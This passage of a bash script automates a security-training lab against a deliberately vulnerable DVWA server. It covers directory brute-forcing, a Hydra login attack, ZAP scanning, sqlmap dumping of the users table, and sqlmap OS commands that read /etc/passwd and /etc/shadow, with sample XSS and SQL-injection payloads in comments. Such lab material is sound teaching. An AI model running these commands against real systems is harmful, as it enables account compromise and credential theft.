    sudo -u "$TARGET_USER" nohup chromium \
      --proxy-server="http=127.0.0.1:8080;https=127.0.0.1:8080" \
      --ignore-certificate-errors \
      --user-data-dir="${USER_HOME}/.config/chromium-burp-profile" \
      --no-sandbox \
      > /dev/null 2>&1 &
    print_success "Chromium launched with Burp proxy and certificates."

    # Once Chromium launched and cert installed, stop Burp Suite
    print_info "Stopping all Burp Suite java processes.."
    sudo pkill -f burpsuite.jar
    sleep 3
    print_success "Burp Suite stopped."

    # ----------------------------------------------------------
    # Docker install block remains unchanged from your original
    if ! hash docker 2>/dev/null; then
        print_info "Docker not found, installing Docker.."
        sudo apt install -y ca-certificates curl gnupg lsb-release
        sudo mkdir -m 0755 -p /etc/apt/keyrings
        curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
        echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
        sudo apt update
        sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
        print_success "Docker installed successfully."
        print_info "Configuring Docker to use public DNS servers..."
        sudo mkdir -p /etc/docker
        echo '{ "dns": ["8.8.8.8", "8.8.4.4"] }' | sudo tee /etc/docker/daemon.json > /dev/null
        sudo systemctl daemon-reload
        sudo systemctl restart docker
        sleep 5
        print_success "Docker daemon configured and restarted."
        sudo systemctl enable docker --now
        sudo usermod -aG docker "$TARGET_USER"
        print_warn "User '$TARGET_USER' added to 'docker' group. Please LOG OUT and LOG BACK IN (or reboot) for this change to take full effect."
    else
        print_info "Docker is already installed."
    fi

    print_info "Testing Docker connectivity by pulling 'hello-world' from Docker Hub..."
    if sudo -u "$TARGET_USER" docker pull hello-world > /dev/null 2>&1; then
        print_success "Successfully pulled 'hello-world' image, confirming Docker network connectivity."
        sudo -u "$TARGET_USER" docker rmi hello-world > /dev/null 2>&1 || true
    else
        print_error "Failed to pull 'hello-world' image. Docker still has network issues."
        print_info "This indicates a fundamental problem with Docker's outbound connectivity from the Kali VM."
        exit 1
    fi
    # Update sudoers file for environment variable persistence
    print_info "Updating sudoers file for environment variable persistence..."
    if ! sudo grep -qxF 'Defaults env_keep += "DVWA_TARGET_URL"' /etc/sudoers; then
        echo 'Defaults env_keep += "DVWA_TARGET_URL"' | sudo tee -a /etc/sudoers > /dev/null
    fi
    if ! sudo grep -qxF 'Defaults env_keep += "DVWA_PHPSESSID"' /etc/sudoers; then
        echo 'Defaults env_keep += "DVWA_PHPSESSID"' | sudo tee -a /etc/sudoers > /dev/null
    fi
    print_success "Sudoers environment persistence configured."
    print_success "Kali attack tools prerequisites installation complete."
}

# Function: kali_run_web_content_scanners
# Runs dirb and gobuster against the DVWA target URL.
kali_run_web_content_scanners() {
    print_title "=== Running Web Content Scanners (dirb, gobuster) ==="

    local TARGET="${DVWA_TARGET_URL}/dvwa/"
    local DIRB_WORDLIST="/usr/share/wordlists/dirb/common.txt" # Common wordlist for dirb
    local GOBUSTER_WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" # Common wordlist for gobuster
    local OUTDIR="$HOME/scans/dvwa/web_content"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    # Check if the target is reachable before scanning
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/http[s]?:\/\///; s/:.*//; s/\/.+//')
    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    # Also check if the web server is responding
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional or accessible."
    fi

    # Run dirb scan
    print_info "Starting Dirb scan against ${TARGET}.."
    if [ -f "$DIRB_WORDLIST" ]; then
        dirb "$TARGET" "$DIRB_WORDLIST" -X .php -o "$OUTDIR/dirb_raw.txt" || print_warn "Dirb scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $DIRB_WORDLIST. Skipping dirb scan."
    fi

    # Run gobuster scan with increased threads for speed
    print_info "Starting Gobuster scan against ${TARGET}.."
    if [ -f "$GOBUSTER_WORDLIST" ]; then
        gobuster dir -u "$TARGET" -w "$GOBUSTER_WORDLIST" -x php -t 50 -o "$OUTDIR/gobuster_raw.txt" || print_warn "Gobuster scan failed or completed with errors. Check target and wordlist."
    else
        print_error "Wordlist not found: $GOBUSTER_WORDLIST. Skipping gobuster scan."
    fi

    print_info "Processing web content scan results.."
    if [ -f "$OUTDIR/dirb_raw.txt" ]; then
        grep '^+' "$OUTDIR/dirb_raw.txt" | awk '{print $2}' | sed "s|$TARGET||" | sort -u > "$OUTDIR/dirb_paths.txt" || true
    else
        print_warn "Dirb raw output not found, cannot process dirb paths."
    fi

    if [ -f "$OUTDIR/gobuster_raw.txt" ]; then
        grep -E '^/' "$OUTDIR/gobuster_raw.txt" | awk '{print $1}' | sort -u > "$OUTDIR/gobuster_paths.txt" || true
    else
        print_warn "Gobuster raw output not found, cannot process gobuster paths."
    fi

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        comm -12 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/common_paths.txt" || true
        comm -23 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/only_in_dirb.txt" || true
        comm -13 "$OUTDIR/dirb_paths.txt" "$OUTDIR/gobuster_paths.txt" > "$OUTDIR/only_in_gobuster.txt" || true
        print_info "Common paths found by dirb and gobuster saved to $OUTDIR/common_paths.txt"
    else
        print_warn "Cannot compare paths, one or both path files missing."
    fi

    print_success "Web content scan results saved in $OUTDIR"
    print_info "Review files in $OUTDIR for discovered web objects : directories and files."

    print_info "Summary of discovered paths:"
    if [ -f "$OUTDIR/dirb_paths.txt" ]; then
        COUNT_DIRB=$(wc -l < "$OUTDIR/dirb_paths.txt")
        echo "  Dirb found:    $COUNT_DIRB paths"
        head -5 "$OUTDIR/dirb_paths.txt" | sed 's|^|    |'
    else
        echo "  Dirb results file missing"
    fi

    if [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        COUNT_GOBUSTER=$(wc -l < "$OUTDIR/gobuster_paths.txt")
        echo "  Gobuster found: $COUNT_GOBUSTER paths"
        head -5 "$OUTDIR/gobuster_paths.txt" | sed 's|^|    |'
    else
        echo "  Gobuster results file missing"
    fi

    if [ -f "$OUTDIR/common_paths.txt" ]; then
        COUNT_COMMON=$(wc -l < "$OUTDIR/common_paths.txt")
        echo "  Common paths:  $COUNT_COMMON paths"
        head -5 "$OUTDIR/common_paths.txt" | sed 's|^|    |'
    else
        echo "  Common paths file missing"
    fi

    echo

    print_info "Detailed results saved in:"
    echo "  - $OUTDIR/dirb_paths.txt"
    echo "  - $OUTDIR/gobuster_paths.txt"
    echo "  - $OUTDIR/common_paths.txt"

    if [ -f "$OUTDIR/dirb_paths.txt" ] && [ -f "$OUTDIR/gobuster_paths.txt" ]; then
        print_info "Unique paths saved in:"
        echo "  - $OUTDIR/only_in_dirb.txt"
        echo "  - $OUTDIR/only_in_gobuster.txt"
    fi
}

# Function: kali_demonstrate_brute_force
# Provides instructions and sample commands for brute-force attacks using Burp Suite and Hydra.
kali_demonstrate_brute_force() {
    print_title "=== Brute-Force Attack Demonstration ==="

    local TARGET="$DVWA_TARGET_URL"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    local ROCKYOU_WORDLIST="/usr/share/wordlists/rockyou.txt.gz"
    local FALLBACK_WORDLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
    local DVWA_BRUTE_FORCE_PATH="/dvwa/vulnerabilities/brute/index.php"
    local OUTDIR="$HOME/scans/dvwa/brute_force"
    mkdir -p "$OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"

    print_info "1. Prepare DVWA (from Kali browser):"
    print_info "   - Log into DVWA as 'admin' / 'password'."
    print_info "   - Navigate to 'DVWA Security' and set the 'Security Level' to 'Low'."
    print_info "   - Click 'Submit'."
    print_warn "   Remember to note your PHPSESSID cookie value from browser developer tools after logging in."
    echo ""

    # Ensure DVWA_PHPSESSID is set either from environment or prompt
    if [ -z "$DVWA_PHPSESSID" ]; then
        echo -ne "Enter DVWA PHPSESSID (e.g., 534uuj0t5702leo6gmot7b5c76, 15s timeout): "
        if ! read -t 15 DVWA_PHPSESSID < /dev/tty; then
            DVWA_PHPSESSID=""
        fi
        # Removed the problematic 'echo' here, now handled by the outer check if needed.
    fi
    
    # This check now correctly uses the local DVWA_PHPSESSID, which holds either the env var value or user input
    if [ -z "$DVWA_PHPSESSID" ]; then
        print_error "DVWA PHPSESSID is required for the Hydra command. Aborting brute-force demo."
        exit 1
    else
        print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    fi
    echo ""

    print_info "3. Running Hydra brute force attack (CLI automation):"
    local WORDLIST_TO_USE=""
    if [ -f "$ROCKYOU_WORDLIST" ]; then
        print_info "Using rockyou.txt.gz wordlist: ${ROCKYOU_WORDLIST}"
        WORDLIST_TO_USE="$ROCKYOU_WORDLIST"
    elif [ -f "$FALLBACK_WORDLIST" ]; then
        print_warn "rockyou.txt.gz not found. Falling back to common passwords: ${FALLBACK_WORDLIST}."
        WORDLIST_TO_USE="$FALLBACK_WORDLIST"
    else
        print_error "No suitable password wordlist found. Please install rockyou.txt.gz or seclists."
        exit 1
    fi

    local HYDRA_CMD="hydra -l admin -P \"${WORDLIST_TO_USE}\" \"${TARGET_HOST}\" http-get-form '${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect.'"

    # Hydra command updated to http-get-form with PHPSESSID
    print_info "Executing command: ${HYDRA_CMD}"
    print_info "   - '-l admin' specifies the username 'admin'."
    print_info "   - '-P' specifies the password list (rockyou.txt.gz or fallback)."
    print_info "   - '${TARGET_HOST}' is the IP/hostname of your DVWA VM."
    print_info "   - 'http-get-form' targets a GET login form."
    print_info "   - '${DVWA_BRUTE_FORCE_PATH}:username=admin&password=^PASS^&Login=Login' defines the target path and GET data."
    print_info "   - 'H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low' injects the session cookie and security level into the HTTP header."
    print_info "   - 'F=Username and/or password incorrect.' is the failure string to detect failed logins."
    print_info "Hydra output will be saved to ${OUTDIR}/hydra_brute_force.log"
    echo ""

    local HYDRA_EXIT_STATUS=0

    # Temporarily disable 'set -e' so script doesn't exit if hydra fails
    set +e
    print_info "Running Hydra. This may take some time depending on the wordlist size.."
    hydra -l admin -P "${WORDLIST_TO_USE}" "${TARGET_HOST}" http-get-form "${DVWA_BRUTE_FORCE_PATH}:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${DVWA_PHPSESSID};security=low:F=Username and/or password incorrect." 2>&1 | tee -a "${OUTDIR}/hydra_brute_force.log"
    HYDRA_EXIT_STATUS=${PIPESTATUS[0]} # Capture hydra's exit status
    set -e || true # Re-enable 'set -e'

    if [ "$HYDRA_EXIT_STATUS" -eq 0 ]; then
        print_success "Hydra brute force attack completed successfully. Check ${OUTDIR}/hydra_brute_force.log for full results."
    else
        print_error "Hydra brute force attack failed or encountered errors (exit code: ${HYDRA_EXIT_STATUS}). Check ${OUTDIR}/hydra_brute_force.log for details."
        # Don't exit here, allow Burp Suite instructions to still be shown
    fi
    echo ""

    print_info "4. Burp Suite configuration (manual steps):"
    print_info "   - Start Burp Suite (Community Edition is sufficient)."
    print_info "   - Configure your Kali browser (e.g., Firefox) to use Burp as an HTTP proxy (typically localhost:8080)."
    print_info "   - Turn 'Intercept is on' in Burp Proxy tab."
    print_info "   - Navigate to DVWA's brute force page: ${TARGET}${DVWA_BRUTE_FORCE_PATH}"
    print_info "   - Enter any username/password (e.g., 'admin'/'password') and click 'Login'."
    print_info "   - Intercept the request in Burp, right-click, and 'Send to Intruder'."
    print_info "   - In Intruder, define attack type (e.g., 'Sniper')."
    print_info "   - Set payload positions for the 'password' field."
    print_info "   - Load a password wordlist (e.g., from /usr/share/seclists) for the password payload."
    print_info "   - Start the attack and analyze responses to find successful logins (look for different response lengths/status codes)."

    print_success "Brute-force attack instructions provided. Manual execution and observation are required for Burp Suite."
}

# Function: kali_demonstrate_vuln_scanners
# Provides guidance for using OWASP ZAP (Docker + AF) or OpenVAS for vulnerability scanning.
kali_demonstrate_vuln_scanners() {
    print_title "=== Vulnerability Scanning Demonstration (OWASP ZAP / OpenVAS) ==="

    if ! command -v docker &> /dev/null; then
        print_error "Docker is not installed. Please run 'kali_prereqs' first or install Docker manually."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local TARGET_HOST=$(echo "$TARGET" | sed -E 's/https?:\/\///; s/:.*//; s/\/.+//')
    
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user for file ownership. Exiting."
        exit 1
    fi
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/vuln_reports"
    
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"
    print_info "Output directory created and owned by '$TARGET_USER': $OUTDIR"


    print_info "Targeting DVWA VM at: ${TARGET}"

    if ! ping -c 1 "$TARGET_HOST" &>/dev/null; then
        print_error "Cannot reach target DVWA VM at ${TARGET_HOST}. Ensure network connectivity and correct DVWA_TARGET_URL."
        exit 1
    fi
    if ! curl -s -o /dev/null -w "%{http_code}" "$TARGET" | grep -q "^200"; then
        print_warn "DVWA target ${TARGET} returned non-200 HTTP status code. It might not be fully functional. Proceeding, but verify."
    fi

    print_info "--- OWASP ZAP (Docker Automation Framework) Scan ---"
    
    # --- Critical Check: Docker Group Membership ---
    print_info "Checking if user '$TARGET_USER' is in the 'docker' group in the current session..."
    if ! id -nG "$TARGET_USER" | grep -qw "docker"; then
        print_error "User '$TARGET_USER' is NOT in the 'docker' group in the current session."
        print_error "Please LOG OUT and LOG BACK IN (or reboot) your Kali VM after running 'kali_prereqs'."
        print_info "Skipping ZAP Docker scan."
        local SKIP_ZAP_SCAN="true"
    else
        print_success "User '$TARGET_USER' is in the 'docker' group."
        local SKIP_ZAP_SCAN="false"
    fi
    # --- End Critical Check ---

    if [ "$SKIP_ZAP_SCAN" == "false" ]; then
        print_info "1. Prepare DVWA for ZAP Scan (if not already done):"
        print_info "   - Ensure DVWA is running and accessible at ${TARGET}."
        print_info "   - Ensure the database has been created via the '/setup.php' page."
        print_info "   - Ensure the security level is set to 'Low' for this scan."
        echo ""

        local DVWA_USER="admin"
        local DVWA_PASS="password"

        echo -ne "\e[96mEnter DVWA Username (default: admin, 15s timeout): \e[0m"
        local USER_INPUT_USERNAME
        if read -t 15 USER_INPUT_USERNAME < /dev/tty && [ -n "$USER_INPUT_USERNAME" ]; then
            DVWA_USER="$USER_INPUT_USERNAME"
        fi
        echo
        print_info "Using DVWA Username: ${DVWA_USER}"

        echo -ne "\e[96mEnter DVWA Password for ${DVWA_USER} (default: password, 15s timeout): \e[0m"
        local USER_INPUT_PASSWORD
        if read -t 15 -s USER_INPUT_PASSWORD < /dev/tty && [ -n "$USER_INPUT_PASSWORD" ]; then
            DVWA_PASS="$USER_INPUT_PASSWORD"
        fi
        echo
        print_info "Using DVWA Password: (hidden)"
        echo ""

        local AF_PLAN_URL="https://github.com/zaproxy/community-scripts/raw/main/other/af-plans/FullScanDvwaAuth.yaml"
        local AF_PLAN_ORIGINAL="${OUTDIR}/FullScanDvwaAuth.original.yaml"
        local AF_PLAN_MODIFIED="${OUTDIR}/FullScanDvwaAuth.modified.yaml"
        local ZAP_REPORT_FILE="${OUTDIR}/zap_full_scan_report.html"
        local ZAP_LOG_FILE="${OUTDIR}/zap_full_scan.log"
        
        print_info "Downloading ZAP Automation Framework plan for authenticated DVWA scan.."
        sudo -u "$TARGET_USER" wget -q "$AF_PLAN_URL" -O "$AF_PLAN_ORIGINAL" || { print_error "Failed to download ZAP AF plan from ${AF_PLAN_URL}."; exit 1; }
        print_success "ZAP AF plan downloaded to ${AF_PLAN_ORIGINAL}."

        print_info "Modifying ZAP AF plan with target URL and credentials.."
        sudo -u "$TARGET_USER" cp "$AF_PLAN_ORIGINAL" "$AF_PLAN_MODIFIED"
        
        # --- CORRECT SED REPLACEMENTS FOR THE ACTUAL YAML FILE ---
        # Replace the hardcoded context URL
        sudo -u "$TARGET_USER" sed -i 's|url: "http://localhost:4280"|url: "'"$TARGET"'"|' "$AF_PLAN_MODIFIED"
        # Replace the hardcoded login URLs
        sudo -u "$TARGET_USER" sed -i 's|loginUrl: "http://localhost:4280/login.php"|loginUrl: "'"$TARGET"'/login.php"|' "$AF_PLAN_MODIFIED"
        sudo -u "$TARGET_USER" sed -i 's|loginPageUrl: "http://localhost:4280/login.php"|loginPageUrl: "'"$TARGET"'/login.php"|' "$AF_PLAN_MODIFIED"
        # Replace the hardcoded credentials
        sudo -u "$TARGET_USER" sed -i 's|username: "admin"|username: "'"$DVWA_USER"'"|' "$AF_PLAN_MODIFIED"
        sudo -u "$TARGET_USER" sed -i 's|password: "password"|password: "'"$DVWA_PASS"'"|' "$AF_PLAN_MODIFIED"
        # Replace the hardcoded report file name with the correct path inside the container
        sudo -u "$TARGET_USER" sed -i 's|reportFile: "ZAP-Report"|reportFile: "/zap/wrk/'"$(basename "$ZAP_REPORT_FILE")"'"|' "$AF_PLAN_MODIFIED"
        # --- END OF CORRECT SED REPLACEMENTS ---
        
        print_success "ZAP AF plan modified successfully."

        print_info "Running OWASP ZAP Docker container with Automation Framework plan (this will take time)..."
        print_info "Docker output will be logged to ${ZAP_LOG_FILE}."

        # ZAP Proxy Payloads
        # http://10.0.31.50/dvwa/login.php 
        # username=admin&password=password&Login=Login&user_token=df02d45cb851cf10968e024dbbb882af        
        # username={%username%}&password={%password%}&user_token={%user_token%}&Login=Login
        # GET http://10.0.31.50/dvwa/vulnerabilities/csrf/test_credentials.php?Login=Login&password=password&username=admin
        # GET http://10.0.31.50/dvwa/vulnerabilities/xss_r/?name=%3C%2Fpre%3E%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Cpre%3E
        # GET http://10.0.31.50/dvwa/vulnerabilities/sqli/?id=1%27+AND+%271%27%3D%271%27+--+&Submit=Submit
        # GET http://10.0.31.50/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit+AND+1%3D1+--+
        # https://stackoverflow.com/questions/68704818/zap-spider-cant-find-form-request-on-dvwa
        
        local CONTAINER_IMAGE="zaproxy/zap-stable"
        local AF_PLAN_BASENAME=$(basename "$AF_PLAN_MODIFIED")

        set +e
        sudo -u "$TARGET_USER" bash <<EOF > "${ZAP_LOG_FILE}" 2>&1
docker run --rm \
  -v "${OUTDIR}:/zap/wrk:rw" \
  -v "${AF_PLAN_MODIFIED}:/zap/zap-automation-framework/${AF_PLAN_BASENAME}" \
  "${CONTAINER_IMAGE}" \
  zap.sh -cmd -autorun "/zap/zap-automation-framework/${AF_PLAN_BASENAME}"
EOF
        local DOCKER_CMD_EXIT_CODE=$?
        set -e
        
        if [ "$DOCKER_CMD_EXIT_CODE" -eq 0 ]; then
            print_success "OWASP ZAP Docker Automation Framework scan completed with exit code 0."
        else
            print_warn "OWASP ZAP Docker AF scan command returned non-zero exit code ($DOCKER_CMD_EXIT_CODE). Check ${ZAP_LOG_FILE} for details."
        fi

        if sudo -u "$TARGET_USER" [ -f "$ZAP_REPORT_FILE" ]; then
            print_success "OWASP ZAP Automation Framework scan completed. Report generated at ${ZAP_REPORT_FILE}."
            print_info "Review the ZAP report for vulnerabilities."
        else
            print_error "OWASP ZAP report not found at ${ZAP_REPORT_FILE}. Scan might have failed."
            print_info "Check logs in ${ZAP_LOG_FILE} for details."
        fi
        echo ""
    fi

    print_info "--- OpenVAS (GVM) Setup and Scan (More for Network/System Vulnerabilities) ---"
    print_info "   - OpenVAS (now GVM) is a powerful network vulnerability scanner but requires significant setup and can consume considerable system resources and time."
    print_info "   - If GVM is not set up, run 'sudo gvm-setup' in a terminal. Follow all prompts."
    print_info "   - Access the GVM web interface (usually https://127.0.0.1:9392 from Kali) using the credentials provided during setup."
    print_info "   - Create a target for your DVWA VM's IP address (e.g., ${TARGET_HOST})."
    print_info "   - Create and run a scan task."
    print_info "   - Once the scan is complete, view and export the report."
    echo ""

    print_info "--- Manual Vulnerability Confirmation and Analysis ---"
    print_info "   - For each 'important' finding listed in your ZAP or OpenVAS report (e.g., SQL Injection, XSS, CSRF):"
    print_info "     - Manually attempt to reproduce and confirm the vulnerability."
    print_info "     - Analyze the DVWA source code to understand why the vulnerability exists."
    print_info "     - Document your findings."

    print_success "Vulnerability scanning guidance and ZAP automated scan provided. Manual analysis and OpenVAS setup are still crucial."
}

# Function: kali_demonstrate_sqlmap_sqli
# Provides sample sqlmap commands for basic SQL injection attacks against DVWA.
kali_demonstrate_sqlmap_sqli() {
    print_title "=== Running SQLmap SQL Injection Scans ==="

    # --- Step 1: Validate Environment Variables ---
    if [ -z "${DVWA_TARGET_URL:-}" ]; then
        print_error "DVWA_TARGET_URL environment variable is not set."
        print_info "Please run the script like: DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_sqlmap_sqli"
        exit 1
    fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then
        print_error "DVWA_PHPSESSID environment variable is not set."
        print_info "Please run the script like: DVWA_PHPSESSID=\"<ID>\" DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_sqlmap_sqli"
        exit 1
    fi
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
    print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    echo ""
    # --- End Validation ---

    local TARGET="${DVWA_TARGET_URL%/}" # Sanitize URL to remove trailing slash
    local PHPSESSID="$DVWA_PHPSESSID"
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/sqlmap_sqli"
    
    # Prepare output directory and ensure correct ownership
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"

    # --- Step 2: Define Base Command and Run Scans ---
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    local COOKIE_STRING="PHPSESSID=${PHPSESSID}; security=low"
    
    # Base command for all sqlmap executions. --batch is critical for non-interactive runs.
    local SQLMAP_BASE_CMD="sqlmap -u \"${SQLI_URL}\" --cookie=\"${COOKIE_STRING}\" --batch --level=1 --risk=1 --output-dir=\"${OUTDIR}\""

    # Scan 1: List Databases
    local DBS_LOG="${OUTDIR}/1_databases_list.log"
    print_info "Running sqlmap to list databases... Log: ${DBS_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} --dbs" > "${DBS_LOG}" 2>&1; then
        print_success "Successfully listed databases."
    else
        print_error "Failed to list databases. Check the log file for details."
    fi
    echo ""

    # Scan 2: List Tables from 'dvwa' database
    local TABLES_LOG="${OUTDIR}/2_tables_list.log"
    print_info "Running sqlmap to list tables from 'dvwa' database... Log: ${TABLES_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa --tables" > "${TABLES_LOG}" 2>&1; then
        print_success "Successfully listed tables."
    else
        print_error "Failed to list tables. Check the log file for details."
    fi
    echo ""

    # Scan 3: List Columns from 'users' table
    local COLUMNS_LOG="${OUTDIR}/3_columns_list.log"
    print_info "Running sqlmap to list columns from 'users' table... Log: ${COLUMNS_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa -T users --columns" > "${COLUMNS_LOG}" 2>&1; then
        print_success "Successfully listed columns."
    else
        print_error "Failed to list columns. Check the log file for details."
    fi
    echo ""

    # Scan 4: Dump data from 'users' table
    local DUMP_LOG="${OUTDIR}/4_users_dump.log"
    print_info "Running sqlmap to dump data from 'users' table... Log: ${DUMP_LOG}"
    if sudo -u "$TARGET_USER" bash -c "${SQLMAP_BASE_CMD} -D dvwa -T users --dump" > "${DUMP_LOG}" 2>&1; then
        print_success "Successfully dumped user data."
    else
        print_error "Failed to dump user data. Check the log file for details."
    fi
    echo ""

    print_success "All SQLmap scans have been executed. Check the logs in ${OUTDIR} for detailed results."
}

# Function: kali_exploit_sqlmap_os_shell
# Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.
kali_exploit_sqlmap_os_shell() {
    print_title "=== Running SQLmap OS Shell Exploitation ==="

    # --- Step 1: Validate Environment Variables ---
    if [ -z "${DVWA_TARGET_URL:-}" ]; then
        print_error "DVWA_TARGET_URL environment variable is not set."
        print_info "Please run the script like: DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_os_shell"
        exit 1
    fi
    if [ -z "${DVWA_PHPSESSID:-}" ]; then
        print_error "DVWA_PHPSESSID environment variable is not set."
        print_info "Please run the script like: DVWA_PHPSESSID=\"<ID>\" DVWA_TARGET_URL=\"http://<IP>\" sudo -E bash -s kali_os_shell"
        exit 1
    fi
    print_info "Using DVWA Target URL: ${DVWA_TARGET_URL}"
    print_info "Using PHPSESSID: ${DVWA_PHPSESSID}"
    echo ""
    # --- End Validation ---

    local TARGET="${DVWA_TARGET_URL%/}" # Sanitize URL
    local PHPSESSID="$DVWA_PHPSESSID"
    local TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    local USER_HOME=$(eval echo "~${TARGET_USER}")
    local OUTDIR="${USER_HOME}/scans/dvwa/os_shell_root"
    
    # Prepare output directory and ensure correct ownership
    sudo mkdir -p "$OUTDIR"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "$OUTDIR"

    print_warn "This exploit requires the DVWA VM to be running a vulnerable MySQL version (e.g., 5.5 in Docker) and for the DVWA directory to be world-writable (ugo+rw)."
    print_warn "Ensure you have already run the 'mysql50' and 'set_permissions_ubuntu' arguments on the Ubuntu VM."
    
    # --- Step 2: Define a Truly Non-Interactive, Robust sqlmap Command ---
    local SQLI_URL="${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    local COOKIE_STRING="PHPSESSID=${PHPSESSID}; security=low"

    # --flush-session: Clears old data for a clean run.
    # --answers="...": Pre-answers the interactive prompts seen in the log.
    # --os=Linux: Specifies the target OS to avoid fingerprinting prompts.
    # --web-root: Explicitly defines the web root to prevent guesswork failures.
    local SQLMAP_BASE_CMD="sqlmap -u \"${SQLI_URL}\" \
        --cookie=\"${COOKIE_STRING}\" \
        --batch \
        --flush-session \
        --os=Linux \
        --web-root=\"/var/www/html/dvwa\" \
        --answers=\"language=4,follow=Y,merge=Y\" \
        --output-dir=\"${OUTDIR}\""

    # Command Execution Array
    declare -a COMMANDS_TO_RUN=("pwd" "whoami" "cat /etc/passwd" "cat /etc/shadow")

    for CMD in "${COMMANDS_TO_RUN[@]}"; do
        local CMD_SLUG=$(echo "$CMD" | tr -d ' /') # Create a safe filename, e.g., "catetcpasswd"
        local CMD_LOG="${OUTDIR}/${CMD_SLUG}.log"
        print_info "Running '${CMD}' via sqlmap --os-cmd. Log: ${CMD_LOG}"

        local FULL_SQLMAP_CMD="${SQLMAP_BASE_CMD} --os-cmd=\"${CMD}\""

        # Temporarily disable 'set -e' for the sqlmap command
        set +e
        sudo -u "$TARGET_USER" bash -c "$FULL_SQLMAP_CMD" > "$CMD_LOG" 2>&1
        local SQLMAP_EXIT_CODE=$?
        set -e

        if [ "$SQLMAP_EXIT_CODE" -eq 0 ]; then
            print_success "sqlmap completed for '${CMD}' (exit code 0)."
            echo "--- Output for '${CMD}' ---"
            # Filter for the actual command output which sqlmap usually puts in a "command output" section
            if grep -q "command output" "$CMD_LOG"; then
                # A bit complex, but this extracts the block of text under "command output"
                sudo awk '/command output:/ {flag=1; next} /\[\*\] ending/ {flag=0} flag' "$CMD_LOG"
            else
                print_warn "Could not find 'command output' section. Displaying raw relevant log:"
                sudo grep -vE '^\[\*\]|^\[INFO\]|^\[WARNING\]' "$CMD_LOG"
            fi
            echo "--------------------------"
        else
            print_error "sqlmap failed for '${CMD}' with exit code $SQLMAP_EXIT_CODE."
            print_info "Check the full log for details: ${CMD_LOG}"
        fi
        echo ""
    done
    
    print_success "All SQLmap OS shell commands have been attempted. Check the logs in ${OUTDIR} for detailed output."
}

# Function to display the final signature
print_signature() {
    echo -e "\n\033[92mCreated with ♡, Harsha\033[0m\n"
}

### === MAIN LOGIC === ###
case "${1:-}" in
    # Ubuntu DVWA VM Arguments
    "dvwa")
        print_info "Detected 'dvwa' argument. Proceeding with DVWA Ubuntu VM installation (SSH + DVWA with Apache2, and Modern MySQL)."
        ubuntu_install_ssh
        ubuntu_install_dvwa_apache_mysql
        print_success "[✔] Full SSH + DVWA (Apache2, Modern MySQL) installation complete on Ubuntu VM."
        print_signature
        ;;
    "mysql50")
        print_info "Detected 'mysql50' argument. Proceeding with Dockerized MySQL 5.5 installation on DVWA Ubuntu VM."
        ubuntu_install_mysql_docker_vulnerable # Call the new Docker function
        print_success "[✔] Dockerized MySQL 5.5 installation complete on Ubuntu VM."
        print_signature
        ;;
    "set_permissions_ubuntu")
